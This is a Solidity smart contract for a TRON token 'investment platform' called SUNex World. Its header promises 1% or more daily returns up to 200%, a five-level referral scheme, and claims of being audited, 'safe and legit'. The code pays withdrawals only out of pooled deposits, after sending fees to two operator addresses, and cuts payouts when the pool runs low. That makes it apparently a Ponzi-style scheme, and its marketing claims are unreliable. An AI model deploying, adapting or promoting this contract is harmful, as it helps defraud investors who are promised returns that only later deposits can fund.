//SourceUnit: SUNexWorld.sol

/*
 *
 *   SUNex World - investment platform based on SUN token smart-contract (TRON blockchain).
 *   Verified, audited, safe and legit!
 *   Powered by original TRONex team! Working with TRONex World platform (https://tronex.world).
 *   All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://sunex.world                                        │
 *   │                                                                       │
 *   │   Telegram Live Support: @tronexsupport                               |
 *   │   Telegram Public Group: @tronexgroup                                 |
 *   │   Telegram News Channel: @tronexnews                                  |
 *   |                                                                       |
 *   |   Twitter: twitter.com/tronex_world                                   |
 *   |   YouTube: youtube.com/channel/UCw3ck_M-JGnEkAph4Bb2HYQ               |
 *   |   Instagram: instagram.com/tronex_world                               |
 *   |   E-mail: admin@sunex.world                                           |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Banko
 *   2) Send any SUN amount using our website invest button. Dont send coin directly on contract address!
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: +1% every 24 hours (+0.0416% hourly)
 *   - Personal hold-bonus: +0.05% for every 12 hours without withdraw
 *   - Contract total amount bonus: +0.05% for every 3,000 SUN on platform address balance
 *
 *   - Minimal deposit: 1 SUN, no maximal limit
 *   - Total income: 200% (deposit included)
 *   - Earnings every moment, withdraw any time
 *   - Total deposits daily limits: NO LIMITS!
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5-level referral commission: 5% - 2% - 1% - 0.5% - 0.5%
 *   - Auto-refback function
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 81% Platform main balance, participants payouts
 *   - 9% Affiliate program bonuses
 *   - 5% Technical support, advertisement and promotion expenses, moderators and support team salary
 *   - 5% Will be converted into TRX and send to TRONex World contract balance (https://tronex.world)
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [LEGAL COMPANY INFORMATION]
 *
 *   - Officially registered company name: TRONex LTD (#12739027)
 *   - Company status: https://beta.companieshouse.gov.uk/company/12739027
 *   - Certificate of incorporation: https://tronex.net/img/certificate.pdf
 *
 *   [SMART-CONTRACT AUDITION AND SAFETY]
 *
 *   - Audited by independent company GROX Solutions (Webiste: https://grox.solutions)
 *   - Audition certificate: https://sunex.world/files/sunex_audit_en.pdf
 *
 */

pragma solidity ^0.5.8;

contract SUNexWorld {
    using SafeMath for uint;
    using SafeTRC20 for ITRC20;

    ITRC20 public token;

    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 1 * (10 ** 18);
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [500, 200, 100, 50, 50];
    uint constant public MARKETING_FEE = 500;
    uint constant public PLATFORM_FEE = 500;
    uint constant public MAX_CONTRACT_PERCENT = 1500;
    uint constant public MAX_HOLD_PERCENT = 1000;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 3000 * (10 ** 18);
    uint constant public TIME_STEP = 1 days;

    uint public totalDeposits;
    uint public totalInvested;
    uint public totalWithdrawn;

    uint public contractPercent;

    address public marketingAddress;
    address public platformAddress;

    struct Deposit {
        uint128 amount;
        uint128 withdrawn;
        uint128 refback;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint16 rbackPercent;
        uint128 bonus;
        uint24[5] refs;
    }

    mapping (address => User) internal users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address marketingAddr, address platformAddr, ITRC20 tokenAddr) public {
        require(!isContract(marketingAddr) && !isContract(platformAddr));

        token = tokenAddr;

        marketingAddress = marketingAddr;
        platformAddress = platformAddr;

        contractPercent = getContractBalanceRate();
    }

    function invest(uint depAmount, address referrer) public {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(depAmount >= INVEST_MIN_AMOUNT, "Minimum deposit amount 1 SUN");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");

        token.safeTransferFrom(msg.sender, address(this), depAmount);

        uint marketingFee = depAmount.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint platformFee = depAmount.mul(PLATFORM_FEE).div(PERCENTS_DIVIDER);

        token.safeTransfer(marketingAddress, marketingFee);
        token.safeTransfer(platformAddress, platformFee);

        emit FeePayed(msg.sender, marketingFee.add(platformFee));

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        uint refbackAmount;
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    uint amount = depAmount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    if (i == 0 && users[upline].rbackPercent > 0) {
                        refbackAmount = amount.mul(uint(users[upline].rbackPercent)).div(PERCENTS_DIVIDER);
                        token.safeTransfer(msg.sender, refbackAmount);

                        emit RefBack(upline, msg.sender, refbackAmount);

                        amount = amount.sub(refbackAmount);
                    }

                    if (amount > 0) {
                        token.safeTransfer(upline, amount);
                        users[upline].bonus = uint128(uint(users[upline].bonus).add(amount));

                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint128(depAmount), 0, uint128(refbackAmount), uint32(block.timestamp)));

        totalInvested = totalInvested.add(depAmount);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, depAmount);
    }

    function withdraw() public {
        User storage user = users[msg.sender];

        uint userPercentRate = getUserPercentRate(msg.sender);

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint128(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = token.balanceOf(address(this));
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);

        token.safeTransfer(msg.sender, totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }

    function setRefback(uint16 rbackPercent) public {
        require(rbackPercent <= 10000);

        User storage user = users[msg.sender];

        if (user.deposits.length > 0) {
            user.rbackPercent = rbackPercent;
        }
    }

    function getContractBalance() public view returns (uint) {
        return token.balanceOf(address(this));
    }

    function getContractBalanceRate() internal view returns (uint) {
        uint contractBalance = token.balanceOf(address(this));
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(5));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn)).add(uint(user.deposits[i].refback));
        }

        return amount;
    }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, getContractBalance(), contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint16, uint16, uint128, uint24[5] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.rbackPercent, users[user.referrer].rbackPercent, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

interface ITRC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeTRC20 {

    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(ITRC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(ITRC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function callOptionalReturn(ITRC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeTRC20: call to non-contract");

        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeTRC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeTRC20: TRC20 operation did not succeed");
        }
    }

}

library Address {

    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

}